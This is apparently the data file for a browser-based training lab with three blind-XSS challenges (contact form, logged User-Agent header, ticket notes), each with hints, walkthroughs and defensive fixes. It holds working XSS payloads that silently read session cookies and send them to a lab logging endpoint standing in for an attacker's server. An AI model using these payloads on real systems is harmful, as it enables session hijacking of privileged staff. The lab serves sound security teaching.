export const BLIND = [
  {
    id: 'blind-contact',
    victim: { label: 'Staff queue', path: '/lab/blind-contact/admin' },
    title: 'Blind XSS in a contact form',
    category: 'blind',
    difficulty: 'practitioner',
    app: 'Greenleaf Store',
    tags: ['blind', 'contact form', 'admin review'],
    summary: 'Your message is only ever read by staff, in an internal panel you cannot see. You fire the payload blind and wait for the callback.',
    scenario:
      'Greenleaf\'s contact form writes submissions into a review queue that only staff can open. The public page shows nothing back, so you cannot tell whether your input is rendered as HTML — this is blind XSS: the payload executes somewhere you have no visibility, in someone else\'s browser. The "Victim view" panel below stands in for that internal tool, and the attacker console stands in for your collection server.',
    goal: 'Plant a payload in the contact form that reports back when staff open the queue.',
    hints: [
      'Nothing is reflected to you. The only feedback loop is the exfiltration channel.',
      'Point your payload at the site\'s own /api/attack/log endpoint, then open the staff view.',
      'If a script tag is filtered, broken images and SVG handlers still work.',
    ],
    payloads: [
      {
        label: 'Report back when staff open the ticket',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=blind-contact&src=staff-queue&d='+encodeURIComponent(document.cookie))\">",
      },
      { label: 'Capture the page the staff member is on', code: "<img src=x onerror=\"fetch('/api/attack/log?lab=blind-contact&src=page&d='+encodeURIComponent(location.href))\">" },
      { label: 'Script tag variant', code: "<script>fetch('/api/attack/log?lab=blind-contact&src=script&d=ping')</script>" },
    ],
    walkthrough: [
      { t: 'Send a probe', d: 'Submit a normal message. You get a thank-you page and no feedback about storage — that is what blind means.' },
      { t: 'Use a callback instead of an alert', d: 'Submit the fetch payload above. An alert would only be useful if you could see it; you cannot.' },
      { t: 'Trigger the reader', d: 'Open the "Staff queue" victim panel. That stands in for a support agent opening the inbox, possibly hours later.' },
      { t: 'Check the console', d: 'The request appears in the attacker console with the staff cookie. That is your proof the payload executed, and your data.' },
    ],
    why:
      'Blind XSS is ordinary stored XSS where the sink is in a tool you cannot browse. Support dashboards, admin panels, log viewers, PDF exporters and email clients are common. Testers use out-of-band callbacks because there is no visible reflection to confirm execution.',
    fix: {
      text: 'Same fix as stored XSS: encode at output, sanitise with an allow-list if HTML is needed, and treat internal tools as production attack surface. Add a CSP so a successful payload still cannot call out.',
      code: "// internal tool, still needs encoding\n<td>${escapeHtml(ticket.message)}</td>\n\n// defence in depth\nContent-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'",
    },
  },
  {
    id: 'blind-header',
    victim: { label: 'Support dashboard', path: '/lab/blind-header/admin' },
    title: 'Blind XSS through a logged request header',
    category: 'blind',
    difficulty: 'practitioner',
    app: 'Nimbus Support',
    tags: ['blind', 'user-agent', 'log viewer'],
    summary: 'The platform stores the User-Agent of every request and shows it in a "recent visitors" widget rendered as HTML.',
    scenario:
      'Nimbus records request metadata — User-Agent, Referer, X-Forwarded-For — and displays it in an internal traffic widget. Headers are user input: they come straight from the client. Because this lab is browser-only, the form below lets you submit a header value exactly as a proxy would capture it.',
    goal: 'Get a payload into the stored header value and have it run in the internal dashboard.',
    hints: [
      'Header values are attacker-controlled strings with no escaping guarantees.',
      'The dashboard renders the stored value as HTML — an img handler survives anything a browser can send.',
      'Submit the value, then open the "Support dashboard" victim panel.',
    ],
    payloads: [
      {
        label: 'Header value to submit',
        code: "<img src=x onerror=\"fetch('/api/attack/log?lab=blind-header&src=ua-dashboard&d='+encodeURIComponent(document.cookie))\">",
      },
      { label: 'A real User-Agent header would look like', code: 'Mozilla/5.0 <img src=x onerror=alert(1)> Gecko/20100101' },
    ],
    walkthrough: [
      { t: 'Submit a header value', d: 'Enter "Mozilla/5.0 (test)" as the User-Agent and save it. It appears in the traffic widget.' },
      { t: 'Check the rendering', d: 'The widget builds rows with innerHTML, so a marker like <b>x</b> renders bold.' },
      { t: 'Plant the payload', d: 'Submit the img payload. Support staff viewing traffic will trigger it.' },
      { t: 'Open the dashboard', d: 'The victim panel loads the internal view; the console records the staff cookie.' },
    ],
    why:
      'Anything the client sends is input: headers, cookies, filenames, multipart field names, HTTP method, even the URL path. Log viewers and analytics dashboards routinely render these strings as HTML, and the readers are privileged users.',
    fix: {
      text: 'Render logs as text, and encode every header value shown in a UI. Normalise or reject control characters at the edge. CSP with connect-src \'self\' limits what a successful payload can do.',
      code: "// vulnerable\nrow.innerHTML = `<td>${entry.ua}</td>`;\n\n// fixed\nconst td = document.createElement('td');\ntd.textContent = entry.ua;",
    },
  },
  {
    id: 'blind-exfil',
    victim: { label: 'Agent console', path: '/lab/blind-exfil/admin' },
    title: 'Blind XSS to session capture',
    category: 'blind',
    difficulty: 'expert',
    app: 'Nimbus Support',
    tags: ['blind', 'exfiltration', 'session capture', 'chain'],
    summary: 'A ticket note becomes code inside the agent console. The goal is not an alert — it is an admin session in your console.',
    scenario:
      'Nimbus agents open tickets in a console that renders the customer-visible notes as HTML. A note is written by the customer, read by the agent. Nobody validates it because "only the customer can write notes". The payload has to be invisible to the agent: no alert, no visible change, just a quiet request carrying the session.',
    goal: 'Capture the agent session in the attacker console without the agent noticing anything.',
    hints: [
      'Use an image-based payload: no dialog, no flicker, nothing for the agent to see.',
      'The admin view carries a session cookie that starts with adm_ — that value is the prize.',
      'Combine document.cookie with location.pathname to show which ticket the agent was reading.',
    ],
    payloads: [
      {
        label: 'Silent session capture',
        code: "<img src=x style=\"display:none\" onerror=\"fetch('/api/attack/log?lab=blind-exfil&src=agent-session&d='+encodeURIComponent(document.cookie))\">",
      },
      {
        label: 'Session plus context (ticket id and page)',
        code: "<img src=x style=\"display:none\" onerror=\"var d=document.cookie+' | '+location.search;fetch('/api/attack/log?lab=blind-exfil&src=agent-context&d='+encodeURIComponent(d))\">",
      },
      {
        label: 'Same idea with an image request (no fetch, works with strict connect-src in some setups)',
        code: "<img src=x style=\"display:none\" onerror=\"new Image().src='/api/attack/log?lab=blind-exfil&src=img&d='+encodeURIComponent(document.cookie)\">",
      },
    ],
    walkthrough: [
      { t: 'Understand the target', d: 'The agent console renders notes as HTML and carries session=adm_…; role=agent. Steal the session and you are the agent.' },
      { t: 'Write a silent payload', d: 'An alert is a failed attack: it tells the victim. Use a hidden img whose onerror fires one request.' },
      { t: 'Wait for the reader', d: 'Open the agent console victim panel. Nothing visible happens — which is exactly what a good blind payload looks like.' },
      { t: 'Read the console', d: 'The stolen value appears under "attacker console". In a real engagement you would replay it in your own browser and land in the agent\'s account.' },
      { t: 'Explain the fix order', d: 'Output encoding stops it; HttpOnly stops cookie theft even if encoding fails; SameSite limits what a stolen session can do from another origin; CSP connect-src blocks the callback.' },
    ],
    why:
      'Blind XSS is most valuable as a pivot. The payload runs in a privileged session with access to internal APIs, so the usual objective is not defacement but a session token, a CSRF token, or a direct API call to add an admin user. This is why XSS stays in the OWASP Top 10 despite decades of awareness.',
    fix: {
      text: 'Layer the defences: contextual output encoding, an allow-list sanitiser for HTML fields, HttpOnly + Secure + SameSite session cookies, a strict CSP, and short session lifetimes with binding to the client.',
      code: "Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Strict; Path=/\nContent-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'",
    },
  },
];
